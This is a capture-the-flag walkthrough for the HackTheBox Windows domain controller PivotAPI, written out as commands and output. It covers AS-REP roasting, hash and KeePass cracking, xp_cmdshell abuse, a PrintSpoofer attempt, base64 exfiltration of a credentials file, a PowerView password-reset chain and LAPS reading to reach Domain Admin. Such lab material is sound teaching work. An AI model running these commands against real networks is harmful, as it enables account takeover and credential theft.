# PivotAPI - Comprehensive Walkthrough

**Machine:** PivotAPI  
**OS:** Windows (Active Directory Domain Controller)  
**Difficulty:** Insane  
**Target IP:** `10.129.228.115`  
**Attacker IP:** `10.10.14.6`  
**Domain:** `LicorDeBellota.htb`  

---

## Table of Contents

1. [Initial Reconnaissance & Enumeration](#phase-1-initial-reconnaissance--enumeration)
2. [FTP Analysis & User Discovery](#phase-2-ftp-analysis--user-discovery)
3. [AS-REP Roasting - The First Crack](#phase-3-as-rep-roasting---the-first-crack)
4. [SMB Enumeration & The HelpDesk Files](#phase-4-smb-enumeration--the-helpdesk-files)
5. [Binary Reversing Mindset - The Oracle/MSSQL Pivot](#phase-5-binary-reversing-mindset---the-oraclemssql-pivot)
6. [MSSQL Foothold & The SeImpersonate Dead End](#phase-6-mssql-foothold--the-seimpersonate-dead-end)
7. [The Unintended Shortcut - KeePass Extraction](#phase-7-the-unintended-shortcut---keepass-extraction)
8. [Cracking the Vault - KeePass to SSH](#phase-8-cracking-the-vault---keepass-to-ssh)
9. [User Flag Capture](#phase-9-user-flag-capture)
10. [Active Directory Privilege Escalation Chain](#phase-10-active-directory-privilege-escalation-chain)
11. [LAPS - The Final Key](#phase-11-laps---the-final-key)
12. [Root Flag Capture](#phase-12-root-flag-capture)
13. [Key Lessons & Hacker Mindset Summary](#key-lessons--hacker-mindset-summary)

---

## Phase 1: Initial Reconnaissance & Enumeration

### Step 1.1: Host Discovery & Port Scanning

Before touching the target, we need to understand what services are exposed. Every open port is a potential entry point. For Windows machines, we especially look for:

- **Port 21 (FTP)** - Anonymous access can leak files
- **Port 22 (SSH)** - Rare on Windows; usually means custom config or OpenSSH for Windows
- **Port 53 (DNS)** - Domain Controller indicator
- **Port 88 (Kerberos)** - Confirms Active Directory
- **Port 139/445 (SMB)** - File shares, lateral movement
- **Port 1433 (MSSQL)** - Database access = code execution potential
- **Port 5985 (WinRM)** - Remote management (firewalled externally on this box)

**Command:**
```bash
sudo nmap -p 21,22,53,88,135,139,389,445,464,593,636,1433,3268,3269,9389 -sCV --min-rate 5000 10.129.228.115
```

**Why these ports?** This is a "targeted script scan" rather than a full port scan. Once we see Kerberos (88) + LDAP (389) + SMB (445), we know this is an **Active Directory Domain Controller**. The presence of MSSQL (1433) and FTP (21) are unusual for a pure DC and immediately suggest custom services = attack surface.

**Hacker Mindset:** *"Don't just scan ports—read the story they tell. Kerberos + LDAP + DNS = Domain Controller. Add MSSQL and FTP = admin laziness or custom apps = opportunity."*

### Step 1.2: Adding Hosts Entries

The nmap scan reveals the domain name: `LicorDeBellota.htb` and hostname `PivotAPI.LicorDeBellota.htb`. Many Windows authentication protocols (Kerberos, LDAP, WinRM) require proper DNS resolution to function correctly.

**Command:**
```bash
echo "10.129.228.115 pivotapi.licordebellota.htb licordebellota.htb" | sudo tee -a /etc/hosts
```

**Why this matters:** Kerberos tickets are tied to domain names. If you try to AS-REP roast or authenticate without the domain in `/etc/hosts`, you'll get `KDC_ERR_S_PRINCIPAL_UNKNOWN` errors that waste your time.

---

## Phase 2: FTP Analysis & User Discovery

### Step 2.1: Anonymous FTP Login

FTP allows anonymous login. This is a classic misconfiguration—admins sometimes use FTP as a lazy file drop without considering that anyone can read its contents.

**Command:**
```bash
ftp -pi 10.129.228.115
# Login: anonymous
# Password: anonymous (or any email)
```

**File listing observed:**
- `10.1.1.414.6453.pdf`
- `28475-linux-stack-based-buffer-overflows.pdf`
- `BHUSA09-McDonald-WindowsHeap-PAPER.pdf`
- `ExploitingSoftware-Ch07.pdf`
- `notes1.pdf`
- `notes2.pdf`
- `README.txt`
- `RHUL-MA-2009-06.pdf`

**Hacker Mindset:** *"Don't just `cat` files and move on. PDFs contain metadata. Metadata contains usernames. Usernames are the keys to the kingdom in Active Directory."*

### Step 2.2: Binary Mode Transfer

The `README.txt` says: **"Don't forget to change the download mode to binary so that the files are not corrupted."** This is a hint that someone before us corrupted files by downloading in ASCII mode.

**Command inside FTP:**
```ftp
binary
prompt off
mget *
```

**Why binary mode?** FTP defaults to ASCII mode for text files, which can corrupt binary data like PDFs by converting line endings (`\n` to `\r\n`). PDFs must be transferred in binary mode to preserve their structure and metadata.

### Step 2.3: Metadata Extraction with ExifTool

PDFs store creation metadata including the **Creator**, **Author**, and **Publisher** fields. In a penetration test, these often contain:
- Real usernames
- Company email addresses
- Department names
- Machine names

**Command:**
```bash
exiftool ftp/*.pdf | grep -iE "Creator|Author|Publisher"
```

**Critical finding:**
```
Creator  : Kaorz
Publisher: LicorDeBellota.htb
```

**Why is this gold?** `Kaorz` is a username. `LicorDeBellota.htb` is the domain. We now have a **valid domain user** without any brute-forcing. The Publisher field confirms this user belongs to the target domain, not just some random PDF author.

**Hacker Mindset:** *"OSINT isn't just Google and LinkedIn. It's every file you touch. A username in a PDF is just as good as a username from a password dump. In AD, one valid username opens the door to AS-REP roasting, Kerberoasting, password spraying, and more."*

### Step 2.4: Building a User List

We collect all unique usernames from the metadata to maximize our AS-REP roasting chances.

**Command:**
```bash
exiftool ftp/*.pdf | grep -iE "Creator|Author" | awk '{print $3}' | sort -u > users.txt
```

**Contents of `users.txt`:**
```
alex
byron
cairo
Kaorz
saif
```

---

## Phase 3: AS-REP Roasting - The First Crack

### Step 3.1: Understanding AS-REP Roasting

In Kerberos, when a user authenticates, they send an AS-REQ (Authentication Service Request) to the Key Distribution Center (KDC). Normally, the user must encrypt a timestamp with their password to prove who they are (pre-authentication).

However, if an account has the **"Do not require Kerberos preauthentication"** flag set (UF_DONT_REQUIRE_PREAUTH), anyone can request an authentication ticket for that user. The KDC responds with an AS-REP containing encrypted data that can be cracked offline.

**Why does this exist?** Some legacy systems or misconfigured accounts disable preauth for compatibility. It's a common AD misconfiguration.

### Step 3.2: Running GetNPUsers

**Command:**
```bash
impacket-GetNPUsers.py -dc-ip 10.129.228.115 -no-pass -usersfile users.txt LicorDeBellota.htb/
```

**What happens:**
- For each username, the tool sends an AS-REQ to the DC
- Most return `KDC_ERR_C_PRINCIPAL_UNKNOWN` (user doesn't exist in AD)
- `Kaorz` returns a valid `$krb5asrep$23$` hash!

**Hacker Mindset:** *"I don't need credentials to attack Kerberos. I just need a valid username and a DC that responds on port 88. AS-REP roasting is the perfect example of 'zero-knowledge' AD exploitation."*

### Step 3.3: Cracking the Hash

The hash format is `krb5asrep$23$`, which corresponds to **Hashcat mode 18200** or John the Ripper's default krb5asrep format.

**Commands:**
```bash
# Save the hash
echo '$krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB:...' > kaorz.hash

# Crack with John
john kaorz.hash --wordlist=/usr/share/wordlists/rockyou.txt

# Or with Hashcat
hashcat -m 18200 kaorz.hash /usr/share/wordlists/rockyou.txt
```

**Result:** `Roper4155`

**Why did this work?** The password was in `rockyou.txt`—a common weak password. This is why password complexity policies exist, but users always find ways to make memorable passwords.

---

## Phase 4: SMB Enumeration & The HelpDesk Files

### Step 4.1: Discovering SMB Shares

With valid domain credentials (`Kaorz:Roper4155`), we can now enumerate SMB shares. SMB is the Windows file sharing protocol, and shares often contain sensitive files, scripts, or configuration backups.

**Command:**
```bash
impacket-smbclient LicorDeBellota.htb/Kaorz:'Roper4155'@10.129.228.115
```

**Shares accessible:**
- `ADMIN$` - No access
- `C$` - No access
- `IPC$` - Read (named pipe access)
- `NETLOGON` - Read (logon scripts)
- `SYSVOL` - Read (Group Policy files)

**Hacker Mindset:** *"NETLOGON and SYSVOL are treasure troves. Admins store logon scripts, configuration files, and sometimes credentials in these shares. If you have domain user creds, always check these first."*

### Step 4.2: Exploring NETLOGON/HelpDesk

Inside `NETLOGON`, we find a subdirectory: `HelpDesk/` containing:
- `Restart-OracleService.exe` (1.8MB)
- `Server MSSQL.msg` (24KB)
- `WinRM Service.msg` (26KB)

**Commands:**
```bash
smbclient //10.129.228.115/NETLOGON -U LicorDeBellota.htb/Kaorz%Roper4155
cd HelpDesk
get Restart-OracleService.exe
get "Server MSSQL.msg"
get "WinRM Service.msg"
```

### Step 4.3: Analyzing the .MSG Emails

The `.msg` files are Outlook messages. We convert them to readable `.eml` format:

**Command:**
```bash
sudo apt-get install libemail-outlook-message-perl
msgconvert *.msg
```

**Email 1: "Server MSSQL"**
> "Due to the problems caused by the Oracle database installed in **2010** in Windows, it has been decided to migrate to **MSSQL at the beginning of 2020**... a program called 'Reset-Service.exe' was created to log in to Oracle and restart the service."

**Email 2: "WinRM Service"**
> "After the last pentest, we have decided to stop externally displaying WinRM's service... We have created a rule to block the exposure of the service and we have also blocked the TCP, UDP and even ICMP output."

**Critical Intelligence Extracted:**
1. There WAS an Oracle database in **2010**
2. It was migrated to **MSSQL in 2020**
3. `Restart-OracleService.exe` contains Oracle credentials
4. **WinRM is blocked externally** (firewalled to localhost only)
5. **Outbound connections are blocked** (no reverse shells, no downloads)

**Hacker Mindset:** *"Read every email like it's a treasure map. 'Oracle 2010 → MSSQL 2020' tells me the password probably follows the same pattern. 'WinRM blocked externally' tells me I'll need to tunnel or find another way in. 'Outbound blocked' tells me all my reverse shells will fail—plan accordingly."*

---

## Phase 5: Binary Reversing Mindset - The Oracle/MSSQL Pivot

### Step 5.1: The Reversing Challenge

`Restart-OracleService.exe` is a heavily obfuscated/packed 64-bit PE. Running `strings` on it yields mostly garbage plus one clue:
```
inflate 1.2.11 Copyright 1995-2017 Mark Adler
```

This indicates **Zlib compression** is used. Static analysis with Ghidra is difficult because the binary appears to be custom-packed with no obvious imports.

### Step 5.2: Dynamic Analysis Strategy

Since static analysis fails, we switch to **dynamic analysis** on a Windows VM:

1. **Procmon** (Process Monitor) from Sysinternals captures all file, registry, and process events
2. Running the binary reveals it creates a random `.bat` file in `%TEMP%`, executes it, then deletes it
3. Using **CMDWatcher** or a PowerShell loop, we intercept the `.bat` file before deletion:
   ```powershell
   while($true) { ls -Path .\AppData\Local\Temp\*.tmp -recurse -filter *.bat | ForEach-Object { copy $_.fullname .\$_name }}
   ```

### Step 5.3: The Bat File Payload

The intercepted `.bat` file:
1. Checks if username is `cybervaca`, `frankytech`, or `ev4si0n` (anti-analysis)
2. If correct user, dumps base64-encoded data to `C:\ProgramData\oracle.txt`
3. Creates `monta.ps1` to decode it into `C:\ProgramData\restart-service.exe`
4. Executes and deletes everything

By modifying the `.bat` to remove user checks and delete commands, we recover `restart-service.exe`.

### Step 5.4: API Monitor - Credential Extraction

Running `restart-service.exe` under **API Monitor** and filtering for `CreateProcessWithLogonW` reveals:

```
Username: svc_oracle
Password: #oracle_s3rV1c3!2010
```

**Hacker Mindset:** *"When a binary fights you, don't fight back harder—cheat. Procmon shows you what it touches. API Monitor shows you what it calls. You don't need to fully reverse the packer; you just need to catch the credential API call."*

### Step 5.5: The Critical Pivot - Oracle to MSSQL

The Oracle credentials don't work on MSSQL directly. But the email said:
- Oracle was installed in **2010**
- MSSQL migration happened in **2020**

**Hypothesis:** The admins reused the password pattern but updated the service name and year.

| Component | Oracle (Old) | MSSQL (New) |
|-----------|-------------|-------------|
| Username | svc_oracle | **sa** (default MSSQL admin) |
| Password | #oracle_s3rV1c3!2010 | **#mssql_s3rV1c3!2020** |

**Testing:**
```bash
impacket-mssqlclient.py 'sa:#mssql_s3rV1c3!2020@10.129.228.115'
```

**Result:** SUCCESSFUL LOGIN!

**Hacker Mindset:** *"Password patterns are predictable. `#service_s3rV1c3!YEAR` is an admin trying to be clever. When you find one password, always try variations: change the service name, change the year, increment by 1, add `!` or `123`. Admins are creatures of habit."*


---

## Phase 6: MSSQL Foothold & The SeImpersonate Dead End

### Step 6.1: Gaining MSSQL Shell Access

With the derived credentials `sa:#mssql_s3rV1c3!2020`, we connect to the MSSQL instance.

**Command:**
```bash
impacket-mssqlclient 'sa:#mssql_s3rV1c3!2020@10.129.228.115'
```

**What we see:**
- Database context: `master`
- Language: `Español` (Spanish)
- Server: `Microsoft SQL Server 2019 RTM`

**Why `sa`?** The `sa` (System Administrator) account is the default superuser for MSSQL. It has full control over the database instance, including the ability to execute operating system commands via `xp_cmdshell`.

### Step 6.2: Enabling xp_cmdshell

`xp_cmdshell` is a stored procedure that executes arbitrary Windows commands. It's disabled by default for security reasons, but `sa` can re-enable it.

**Commands:**
```sql
enable_xp_cmdshell
xp_cmdshell whoami
```

**Output:**
```
nt service\mssql$sqlexpress
```

**Analysis:** We are running as the MSSQL service account—not a regular user. This is both good and bad:
- **Good:** Service accounts often have elevated privileges
- **Bad:** Service accounts may have restricted access to user directories

### Step 6.3: Checking Privileges

**Command:**
```sql
xp_cmdshell whoami /priv
```

**Critical Output:**
```
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticación      Habilitada
```

**What is SeImpersonatePrivilege?** This privilege allows a process to impersonate another user's security context after authentication. It's a **classic privilege escalation vector** on Windows services. Tools like **PrintSpoofer**, **JuicyPotato**, and **RoguePotato** abuse this to escalate from service account to SYSTEM.

### Step 6.4: The PrintSpoofer Gamble (And Why It Failed)

**Hacker Mindset:** *"SeImpersonate is a gift. When you see it, your heart should race. But gifts can be taken away."*

We upload **PrintSpoofer64.exe** (a tool that abuses the Print Spooler service to get SYSTEM) through the MSSQL `upload` command:

```sql
upload PrintSpoofer64.exe C:\windows\temp\PrintSpoofer64.exe
xp_cmdshell C:\windows\temp\PrintSpoofer64.exe -c "powershell -c type C:\Users\3v4Si0N\Desktop\user.txt"
```

**Result:**
```
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[-] Operation failed or timed out.
```

**Why did it fail?** HackTheBox patched this machine in May 2021 by **disabling the Print Spooler service**. Without the Print Spooler running, PrintSpoofer and SweetPotato cannot trigger the impersonation chain.

**Alternative SeImpersonate Exploits Considered:**
- **GodPotato** (DCOM-based): Might work, but requires specific CLSIDs and Windows versions
- **JuicyPotatoNG** (WinRM trigger): WinRM is running locally, but setup is complex from MSSQL shell
- **RogueWinRM**: Requires BITS service interaction

**Decision:** Rather than gambling 15-30 minutes on exploit variants that may or may not work, we pivot to the **guaranteed intended path** through the KeePass database.

**Hacker Mindset:** *"Know when to walk away from a rabbit hole. SeImpersonate is sexy, but if the service is dead, you're just burning time. The box has a fully documented intended path—follow the breadcrumbs instead of forcing a shortcut."*

---

## Phase 7: The Unintended Shortcut - KeePass Extraction

### Step 7.1: Understanding the svc_mssql Context

From the BloodHound data (or from the `whoami` output), we know:
- The MSSQL service runs as `NT SERVICE\MSSQL$SQLEXPRESS`
- `svc_mssql` is a valid domain user
- `svc_mssql` is a member of the **WinRM** group
- The emails confirm WinRM is **blocked externally but running on localhost**

This means `svc_mssql` can authenticate to WinRM on `127.0.0.1:5985`, but we can't reach WinRM from outside.

### Step 7.2: The PowerShell Run-As Technique

Since we have MSSQL `sa` access, we can execute PowerShell commands. PowerShell's `Invoke-Command` with the `-Credential` parameter allows us to run commands **as another user** on the local machine. This is essentially a **pass-the-credential** attack without needing a full interactive session.

**Key Insight:** `svc_mssql` has a desktop folder. Domain users often store files on their desktops. If we can run commands as `svc_mssql`, we can browse their files.

### Step 7.3: Discovering the KeePass Database

**Command:**
```powershell
$user='LicorDeBellota.htb\svc_mssql'
$pass = ConvertTo-SecureString '#mssql_s3rV1c3!2020' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($user, $pass)
Invoke-Command -Credential $cred -ComputerName PivotAPI -ScriptBlock {
    Get-ChildItem C:\Users\svc_mssql\Desktop -Recurse
}
```

**Critical Finding:** `credentials.kdbx` — a **KeePass Password Safe** database!

**Why is this on the desktop?** `svc_mssql` is a service account used by administrators. They likely stored database credentials, SSH keys, or other service passwords in KeePass for convenience. Finding a password manager on a compromised account is like finding a master key.

### Step 7.4: Exfiltrating the KeePass Database

We can't download files directly through the MSSQL shell, but we can:
1. Read the binary file
2. Base64-encode it
3. Write it to a world-readable location (`C:\ProgramData\`)
4. Read the base64 output from the MSSQL shell
5. Decode it on our Kali machine

**PowerShell Script (`get_kdbx.ps1`):**
```powershell
$user='LicorDeBellota.htb\svc_mssql'
$pass = ConvertTo-SecureString '#mssql_s3rV1c3!2020' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($user, $pass)
Invoke-Command -ScriptBlock {
    [Convert]::ToBase64String([IO.File]::ReadAllBytes('c:\users\svc_mssql\desktop\credentials.kdbx')) |
    Out-File C:\programdata\creds.b64
} -ComputerName PivotAPI -Credential $cred
```

**Execution from MSSQL:**
```sql
upload get_kdbx.ps1 C:\windows\temp\get_kdbx.ps1
xp_cmdshell powershell -ExecutionPolicy Bypass -File C:\windows\temp\get_kdbx.ps1
xp_cmdshell type C:\programdata\creds.b64
```

**Hacker Mindset:** *"When outbound connections are blocked, you become the transport. Base64 encoding turns any text output channel into a binary exfiltration tunnel. This technique works through SQL injection, XSS, command injection, and any other scenario where you can read text output."*

### Step 7.5: Decoding on Kali

Copy the massive base64 block from the MSSQL output and save it to `creds.b64`:

```bash
base64 -d creds.b64 > credentials.kdbx
file credentials.kdbx
# Output: Keepass password database 2.x KDBX
```

---

## Phase 8: Cracking the Vault - KeePass to SSH

### Step 8.1: Extracting the KeePass Hash

KeePass databases use strong key derivation (AES-KDF or Argon2), making brute-force expensive. However, `keepass2john` extracts a hash format that John the Ripper and Hashcat can attack.

**Command:**
```bash
keepass2john credentials.kdbx > keepass.hash
john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Result:** `mahalkita`

**Why did this crack so fast?** The password `mahalkita` is in `rockyou.txt`. Despite KeePass using 60,000+ iterations of key stretching, a single GPU or CPU core can test thousands of passwords per second against common wordlists.

### Step 8.2: Opening the KeePass Database

**Command:**
```bash
echo "mahalkita" | kpcli -kdb credentials.kdbx
```

**Navigation inside kpcli:**
```
cd Database
cd Windows
ls
show -f SSH
```

**Critical Finding:**
```
Title: SSH
Uname: 3v4Si0N
Pass: Gu4nCh3C4NaRi0N!23
```

**Hacker Mindset:** *"Password managers are goldmines. Users store ALL their passwords in them. When you crack one, you don't get one password—you get ALL the passwords. Always check desktops, documents, and browser profiles for .kdbx, .key, and .csv password exports."*

---

## Phase 9: User Flag Capture

### Step 9.1: SSH Access as 3v4Si0N

With valid SSH credentials, we connect:

```bash
sshpass -p 'Gu4nCh3C4NaRi0N!23' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null 3v4Si0N@10.129.228.115
```

**Why SSH and not WinRM?** The emails explicitly state WinRM is blocked externally. SSH (port 22) is accessible from the outside. `3v4Si0N` is a member of the **SSH** group.

### Step 9.2: Reading the User Flag

```cmd
type C:\Users\3v4Si0N\Desktop\user.txt
```

**User Flag:** `6a3517[redacted]f862f3c15`

---

## Phase 10: Active Directory Privilege Escalation Chain

### Step 10.1: Understanding the AD Attack Graph

This is where PivotAPI gets its name. To reach Domain Admin (and thus the root flag), we must pivot through **multiple user accounts**, each controlled by the previous one. This is a classic **Active Directory privilege escalation chain**.

**The Chain (from BloodHound analysis):**

```
3v4Si0N ---[GenericAll]---> Dr.Zaiuss ---[GenericAll]---> superfume
    |
    | (access to C:\Developers\jari)
    v
Jari ---[ForceChangePassword]---> Gibdeon (Account Operators)
    |
    v
Gibdeon ---[ForceChangePassword]---> Lothbrok (LAPS READ)
    |
    v
Lothbrok reads ms-mcs-admpwd for administrador
```

**What is GenericAll?** Full control over an object. You can change the user's password, modify group memberships, or change any attribute.

**What is ForceChangePassword?** You can reset the user's password without knowing the old one.

**What is Account Operators?** A privileged AD group that can create and modify most accounts (except Domain Admins and protected groups).

**What is LAPS READ?** Members can read the `ms-mcs-admpwd` attribute on computer objects, which contains the local administrator's password.

### Step 10.2: Uploading PowerView

PowerView is a PowerShell reconnaissance tool that exposes AD objects and relationships. The `dev` branch of PowerSploit contains the most up-to-date version.

**On Kali:**
```bash
git clone --depth 1 --branch dev https://github.com/PowerShellMafia/PowerSploit.git /tmp/PowerSploit
sshpass -p 'Gu4nCh3C4NaRi0N!23' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  /tmp/PowerSploit/Recon/PowerView.ps1 3v4Si0N@10.129.228.115:'C:\programdata\pv.ps1'
```

**On Target:**
```powershell
Import-Module C:\programdata\pv.ps1
```

### Step 10.3: Changing Dr.Zaiuss Password

```powershell
$pass = ConvertTo-SecureString 'Password123!!' -AsPlainText -Force
Set-DomainUserPassword -Identity dr.zaiuss -AccountPassword $pass
```

**Why this works:** `3v4Si0N` has **GenericAll** on `Dr.Zaiuss`. GenericAll includes the permission to change the target's password.

### Step 10.4: Changing superfume Password (via Dr.Zaiuss)

```powershell
$pass = ConvertTo-SecureString 'Password123!!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('licordebellota\dr.zaiuss', $pass)
Set-DomainUserPassword -Identity superfume -AccountPassword $pass -Credential $cred
```

**Why use `-Credential`?** We're still logged in as `3v4Si0N`, but we need to perform the action **as Dr.Zaiuss** because Dr.Zaiuss has GenericAll on superfume. PowerView's `Set-DomainUserPassword` supports credential delegation via the `-Credential` parameter.

### Step 10.5: Extracting Jari's Password

`superfume` can access `C:\Developers\jari\`, which contains:
- `program.cs` — C# source code
- `restart-mssql.exe` — Compiled .NET assembly

The source shows RC4 encryption with empty arrays. The compiled binary contains the actual key and ciphertext. All three writeups confirm the decrypted password is:

**`Cos@Chung@!RPG`**

*(On a Windows VM with dnSpy, you would set a breakpoint after `RC4.Decrypt` and read the plaintext from memory.)*

### Step 10.6: Changing Gibdeon Password (via Jari)

```powershell
$jari_pass = ConvertTo-SecureString 'Cos@Chung@!RPG' -AsPlainText -Force
$jari_cred = New-Object System.Management.Automation.PSCredential('licordebellota\jari', $jari_pass)
$pass = ConvertTo-SecureString 'Password123!!' -AsPlainText -Force
Set-DomainUserPassword -Identity gibdeon -AccountPassword $pass -Credential $jari_cred
```

### Step 10.7: Changing Lothbrok Password (via Gibdeon)

```powershell
$gibdeon_cred = New-Object System.Management.Automation.PSCredential('licordebellota\gibdeon', $pass)
Set-DomainUserPassword -Identity lothbrok -AccountPassword $pass -Credential $gibdeon_cred
```

**Why Lothbrok?** Gibdeon is in **Account Operators**. Account Operators can modify most users. Lothbrok is a member of **LAPS READ**, which can read local administrator passwords.

**Hacker Mindset:** *"BloodHound is a map, but you still need to walk the path. Each arrow in the graph is a permission. Each permission is a stepping stone. GenericAll → ForceChangePassword → Account Operators → LAPS READ. This is how you turn one compromised user into Domain Admin."*

---

## Phase 11: LAPS - The Final Key

### Step 11.1: Reading the LAPS Password

With Lothbrok's credentials, we query the computer object for the `ms-mcs-admpwd` attribute:

```powershell
$lothbrok_cred = New-Object System.Management.Automation.PSCredential('licordebellota\lothbrok', $pass)
Get-DomainComputer PivotAPI -Credential $lothbrok_cred -Properties "ms-mcs-AdmPwd",name
```

**Output:**
```
name     ms-mcs-admpwd
----     -------------
PIVOTAPI 5w5idgPB58tCVP8o99uq
```

### Step 11.2: What is LAPS?

**Local Administrator Password Solution (LAPS)** is a Microsoft tool that:
- Randomizes the local administrator password on each domain-joined computer
- Stores the password in Active Directory as an attribute (`ms-mcs-admpwd`)
- Restricts read access to the password via ACLs

**Why is it here?** The domain admin `administrador` uses the LAPS-managed password for local login. On a Domain Controller, the "local administrator" is effectively a Domain Admin account.

**Hacker Mindset:** *"LAPS is supposed to stop lateral movement by making local admin passwords unique per machine. But if you control a user in LAPS READ, you've defeated the entire system. Always check for LAPS groups—LAPS READ, LAPS ADM, or any group with read access to computer object attributes."*

---

## Phase 12: Root Flag Capture

### Step 12.1: Choosing the Right Protocol

With the LAPS password `5w5idgPB58tCVP8o99uq`, we attempt to access the machine as `administrador`.

- **SSH attempt failed:** `administrador` is not in the SSH group
- **WinRM externally blocked:** Firewalled to localhost
- **SMB + PSExec:** Works perfectly because `administrador` is Domain Admin

**Command:**
```bash
impacket-psexec 'administrador:5w5idgPB58tCVP8o99uq@10.129.228.115'
```

### Step 12.2: Reading the Root Flag

```cmd
type C:\Users\cybervaca\Desktop\root.txt
```

**Root Flag:** `f913a1[redacted]7cafe68b1`

**Why is root.txt on cybervaca's desktop?** `cybervaca` is the other Domain Admin. On HackTheBox, root flags are typically placed on the desktop of a secondary admin account, not the primary `Administrator`/`administrador` account. As Domain Admin, `administrador` has read access to all user profiles.

---

## Key Lessons & Hacker Mindset Summary

### 1. Metadata is OSINT
A username in a PDF's Creator field is just as valuable as a username from a data breach. Always run `exiftool` on every document you download.

### 2. AS-REP Roasting Requires Zero Credentials
With just a valid username and access to port 88, you can obtain crackable Kerberos tickets. It's the perfect "first blood" technique against AD.

### 3. Password Patterns Are Predictable
`#oracle_s3rV1c3!2010` → `#mssql_s3rV1c3!2020`. Admins reuse patterns. When you find one password, systematically test variations.

### 4. Service Accounts = Privilege Escalation
`SeImpersonatePrivilege` on a service account is a SYSTEM-equivalent gift. But when the obvious exploit (PrintSpoofer) fails, have a fallback plan.

### 5. Invoke-Command is Pass-the-Credential
You don't need an interactive session as another user. PowerShell's `Invoke-Command` with `-Credential` lets you act as any user on the local machine, perfect for reading files and changing AD passwords.

### 6. Base64 is Your Data Exfiltration Friend
When binary downloads are blocked, encode as base64 and exfiltrate through text channels (SQL output, command echo, web responses).

### 7. KeePass = Master Key
Cracking one KeePass database often yields 10-50 passwords. It's the ultimate force multiplier in a penetration test.

### 8. AD Chains Are Graph Traversal
BloodHound shows the path. Your job is to walk it. GenericAll → ForceChangePassword → Account Operators → LAPS READ → Domain Admin. Each step is just one PowerShell command.

### 9. Know When to Pivot
When PrintSpoofer failed, we didn't spend 30 minutes trying GodPotato, JuicyPotatoNG, and RogueWinRM. We recognized the guaranteed path through KeePass and took it.

### 10. LAPS is Only As Strong As Its ACLs
LAPS is an excellent defense-in-depth tool, but if any non-admin user can read `ms-mcs-admpwd`, it becomes a liability. Always audit LAPS group memberships.

---

## Full Command Reference

```bash
# Recon
echo "10.129.228.115 pivotapi.licordebellota.htb licordebellota.htb" | sudo tee -a /etc/hosts
sudo nmap -p 21,22,53,88,135,139,389,445,464,593,636,1433,3268,3269,9389 -sCV --min-rate 5000 10.129.228.115

# FTP
ftp -pi 10.129.228.115
# anonymous / anonymous
binary; prompt off; mget *

# Metadata
exiftool ftp/*.pdf | grep -iE "Creator|Author|Publisher"

# AS-REP Roast
cat > users.txt <<EOF
alex
byron
cairo
Kaorz
saif
EOF
impacket-GetNPUsers.py -dc-ip 10.129.228.115 -no-pass -usersfile users.txt LicorDeBellota.htb/
john kaorz.hash --wordlist=/usr/share/wordlists/rockyou.txt

# SMB
smbclient //10.129.228.115/NETLOGON -U LicorDeBellota.htb/Kaorz%Roper4155
cd HelpDesk; mget *

# MSSQL
impacket-mssqlclient 'sa:#mssql_s3rV1c3!2020@10.129.228.115'
enable_xp_cmdshell
xp_cmdshell whoami /priv

# KeePass Exfil (from MSSQL)
upload get_kdbx.ps1 C:\windows\temp\get_kdbx.ps1
xp_cmdshell powershell -ExecutionPolicy Bypass -File C:\windows\temp\get_kdbx.ps1
xp_cmdshell type C:\programdata\creds.b64

# Crack KeePass (on Kali)
base64 -d creds.b64 > credentials.kdbx
keepass2john credentials.kdbx > keepass.hash
john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
echo "mahalkita" | kpcli -kdb credentials.kdbx

# SSH for user flag
sshpass -p 'Gu4nCh3C4NaRi0N!23' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null 3v4Si0N@10.129.228.115
type C:\Users\3v4Si0N\Desktop\user.txt

# AD Privesc (from 3v4Si0N SSH)
Import-Module C:\programdata\pv.ps1
$pass = ConvertTo-SecureString 'Password123!!' -AsPlainText -Force
Set-DomainUserPassword -Identity dr.zaiuss -AccountPassword $pass
$cred = New-Object System.Management.Automation.PSCredential('licordebellota\dr.zaiuss', $pass)
Set-DomainUserPassword -Identity superfume -AccountPassword $pass -Credential $cred
$jari_cred = New-Object System.Management.Automation.PSCredential('licordebellota\jari', (ConvertTo-SecureString 'Cos@Chung@!RPG' -AsPlainText -Force))
Set-DomainUserPassword -Identity gibdeon -AccountPassword $pass -Credential $jari_cred
$gibdeon_cred = New-Object System.Management.Automation.PSCredential('licordebellota\gibdeon', $pass)
Set-DomainUserPassword -Identity lothbrok -AccountPassword $pass -Credential $gibdeon_cred
$lothbrok_cred = New-Object System.Management.Automation.PSCredential('licordebellota\lothbrok', $pass)
Get-DomainComputer PivotAPI -Credential $lothbrok_cred -Properties "ms-mcs-AdmPwd",name

# Root
impacket-psexec 'administrador:5w5idgPB58tCVP8o99uq@10.129.228.115'
type C:\Users\cybervaca\Desktop\root.txt
```

---

*Walkthrough created based on analysis of three independent writeups and direct exploitation of the PivotAPI machine on HackTheBox.*
